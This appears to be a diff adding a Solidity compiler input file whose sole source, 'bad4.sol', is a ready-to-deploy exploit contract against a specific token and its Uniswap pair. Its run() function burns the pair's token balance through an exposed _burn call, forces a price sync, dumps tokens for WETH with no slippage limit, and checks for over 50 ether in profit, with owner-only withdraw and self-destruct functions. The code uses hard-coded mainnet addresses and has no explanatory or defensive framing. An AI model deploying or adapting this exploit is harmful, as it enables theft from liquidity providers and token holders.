@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "contracts/bad4.sol": {
+      "content": "pragma solidity ^0.7.0;\n\n\ninterface IUniswapV2Router02 {\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function WETH() external pure returns (address);\n    \n}\n\ninterface mytoken {\n    function _burn(address sender, uint256 tBurn) external ;\n    function balanceOf(address account)  external returns (uint256) ;\n    function approve(address spender, uint256 amount) external  returns (bool);\n    \n}\n\n\ninterface mytarget {\n    function sync() external;\n}\n\n\ninterface IERC20 {\n    function transfer(address _to, uint256 _amount) external returns (bool);\n    function balanceOf(address account)  external returns (uint256) ;\n    function withdraw(uint wad) external;\n}\n\n\ncontract x {\n\n\n   \n   event echo(uint256 data);\n   event echo2(address ad);\n   event echo3(bytes by);\n   \n   address payable private  owner = address(0x0);\n   address private target = address(0xb406478558A8Cd0f3f7AF9E1e6258dFF722E8Cd4);\n   address private token = address(0x19fAb8f7dfFfF38268644eAEBd3d538F68036000);\n   address private uniswaprouter = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n   address private weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n   \n\n   // Similar to many class-based object-oriented languages, a constructor is a special function that is only executed upon contract creation.\n   // Constructors are used to initialize the contract's data. Learn more:https://solidity.readthedocs.io/en/v0.5.10/contracts.html#constructors\n   constructor() {\n        owner = msg.sender;\n        \n   }\n\n   //withdraw function\n   function w() public {\n       \n       require(msg.sender==owner);\n       msg.sender.call{value:address(this).balance}(\"\");\n       \n   }\n   \n   //deposit function\n   function d() public payable{\n\n   }\n   \n   \n   // withdraw token function\n   function withdrawToken(address _tokenContract, uint256 _amount) public {\n       \n        require(msg.sender==owner);\n        IERC20 tokenContract = IERC20(_tokenContract);\n        tokenContract.transfer(msg.sender, _amount);\n    }\n     \n     \n    fallback()   payable external {\n\n    }\n    \n    function destroy() public{\n        require(msg.sender==owner);\n        selfdestruct(owner);\n        \n    }\n    \n    \n    function burn() private{\n        //burn the target address's balance to 10\n        mytoken(token)._burn(target, mytoken(token).balanceOf(target) - 10);\n        \n        emit echo(mytoken(token).balanceOf(target));\n        \n    }\n    \n    function sync() private{\n        //sync the price of uniswap target\n        mytarget(target).sync();\n    }\n    \n    \n    \n   // approve for token sell\n   function approve() private{\n       \n       //approve target to use 0xffffffffff...fffffffffff token in address(this)\n       mytoken(token).approve(uniswaprouter,uint(-1));\n       \n   }\n   \n   function swaptokenforWeth() private{\n       \n        address[] memory path = new address[](2);\n        path[0] = token;\n        path[1] = weth;\n        \n        uint256 tokenAmount = mytoken(token).balanceOf(address(this)); \n        \n        \n       IUniswapV2Router02(uniswaprouter).swapExactTokensForETHSupportingFeeOnTransferTokens(\n           tokenAmount,\n           0, // accept any amount of WETH\n           path,\n           address(this),  // send to address(this)\n           block.timestamp\n           );\n           \n        \n       \n   }\n   \n   \n   function swapwethforeth() private{\n       \n       \n       uint256 balance = IERC20(weth).balanceOf(address(this));\n       \n       emit echo(balance);\n       \n       IERC20(weth).withdraw(balance);\n       \n   }\n   \n\n   function run() public{\n       \n       require(msg.sender==owner,\"not admin\");\n       approve();\n       burn();\n       sync();\n       swaptokenforWeth();\n       swapwethforeth();\n       \n       require(address(this).balance > 50 ether, \"do not get enough ether\");\n       \n       \n   }\n\n   \n   \n}\n\n"
+    }
+  }
+}
